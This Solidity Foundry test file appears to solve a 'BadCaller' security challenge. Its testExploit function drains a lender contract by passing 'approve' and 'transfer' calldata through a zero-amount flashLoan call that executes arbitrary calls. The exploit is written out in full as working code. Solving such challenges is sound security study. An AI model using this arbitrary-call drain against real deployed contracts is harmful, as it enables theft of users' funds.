// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {BadCallerBaseTest} from "./BadCallerBase.t.sol";

contract BadCallerTest is BadCallerBaseTest {
    function testExploit() external validation {
        // vm.startPrank(victim);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", msg.sender, lender.assets());
        lender.flashLoan(msg.sender, 0, data);
        data = abi.encodeWithSignature("transfer(address,uint256)", msg.sender, lender.assets());
        lender.flashLoan(msg.sender, 0, data);
        // console2.log("assets: %d", lender.assets());
        // lender.loanToken.transfer(msg.sender, lender.assets());
        // vm.stopPrank();
    }
}
